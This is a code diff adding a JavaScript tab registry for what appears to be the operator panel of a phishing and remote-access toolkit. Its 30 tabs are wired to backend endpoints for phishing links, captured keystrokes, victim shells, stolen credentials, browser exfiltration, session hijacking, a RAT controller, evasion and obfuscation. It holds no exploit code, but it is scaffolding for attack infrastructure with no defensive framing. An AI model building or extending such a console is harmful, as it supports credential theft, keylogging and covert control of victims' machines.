@@ -1,0 +1,36 @@
+// P11 — tab registry. Mirrors the 30 legacy tabs 1:1 (id + label + icon) and
+// names the real API endpoints each one reads, so the V2 panel is wired to the
+// same backend surface (no reimplementation of logic).
+
+export const TABS = [
+  { id: "links", label: "Phishing Links", icon: "🔗", endpoints: ["/list_templates"] },
+  { id: "images", label: "Images", icon: "🖼", endpoints: ["/api/images"] },
+  { id: "audio", label: "Audio", icon: "🎙", endpoints: ["/api/audio"] },
+  { id: "logs", label: "Live Traffic", icon: "📜", endpoints: ["/api/keystrokes/list", "/api/operator/log"] },
+  { id: "terminal", label: "Terminal", icon: "⌨", endpoints: ["/api/system/info"] },
+  { id: "c2", label: "Victim Shells", icon: "🖥", endpoints: ["/api/c2/clients"] },
+  { id: "files", label: "File Manager", icon: "📁", endpoints: ["/api/c2/clients"] },
+  { id: "mobile", label: "Mobile", icon: "📱", endpoints: ["/api/mobile/clients", "/api/mobile/captures"] },
+  { id: "analytics", label: "Analytics", icon: "📊", endpoints: ["/api/analytics/dashboard", "/api/analytics/timeline", "/api/analytics/geo"] },
+  { id: "intel", label: "Intel", icon: "🛡", endpoints: ["/api/fingerprints/list", "/api/alerts"] },
+  { id: "credentials", label: "Credentials", icon: "🔑", endpoints: ["/api/credentials/list", "/api/credentials/stats"] },
+  { id: "live", label: "Live Ops", icon: "⚡", custom: "live" },
+  { id: "payloads", label: "Payloads", icon: "📦", endpoints: ["/api/payloads/types", "/api/strike/actions"] },
+  { id: "campaigns", label: "Campaigns", icon: "🎯", endpoints: ["/api/campaigns/list"] },
+  { id: "profiles", label: "Profiles", icon: "👤", endpoints: ["/api/profiles/list"] },
+  { id: "obfuscation", label: "Obfuscation", icon: "🧬", endpoints: ["/api/obfuscate/profiles"] },
+  { id: "reports", label: "Reports", icon: "📄", endpoints: ["/api/reports"] },
+  { id: "lures", label: "Lures", icon: "🪝", endpoints: ["/api/lures/categories", "/api/lures/saved"] },
+  { id: "exfil", label: "Exfiltration", icon: "📤", endpoints: ["/api/browser-exfil", "/api/browser-exfil/stats"] },
+  { id: "network", label: "Network", icon: "🌐", endpoints: ["/api/network/discoveries", "/api/net/resolve?host=localhost"] },
+  { id: "playbooks", label: "Playbooks", icon: "🎬", endpoints: ["/api/playbooks"] },
+  { id: "evasion", label: "Evasion", icon: "🥷", endpoints: ["/api/evasion/profiles", "/api/evasion/saved"] },
+  { id: "threat-intel", label: "Threat Intel", icon: "🔭", endpoints: ["/api/threat-intel/types", "/api/threat-intel/history"] },
+  { id: "session-hijack", label: "Session Hijack", icon: "🍪", endpoints: ["/api/session-hijack/features", "/api/session-hijack/history"] },
+  { id: "pivot", label: "Pivot Engine", icon: "🔀", endpoints: ["/api/pivot/history", "/api/pivot/capabilities"] },
+  { id: "rat", label: "RAT Controller", icon: "🐀", endpoints: ["/api/rat/history", "/api/rat/injection"] },
+  { id: "ai-threat", label: "AI Threat", icon: "🤖", endpoints: ["/api/ai-threat/landscape", "/api/ai-threat/anomalies"] },
+  { id: "zeroday", label: "Zero-Day Lab", icon: "💥", endpoints: [] },
+  { id: "quantum", label: "Quantum Crypto", icon: "⚛", endpoints: ["/api/quantum/algorithms", "/api/quantum/benchmark"] },
+  { id: "deeprecon", label: "Deep Recon", icon: "🔎", endpoints: ["/api/targets", "/api/c2/beacons"] },
+];
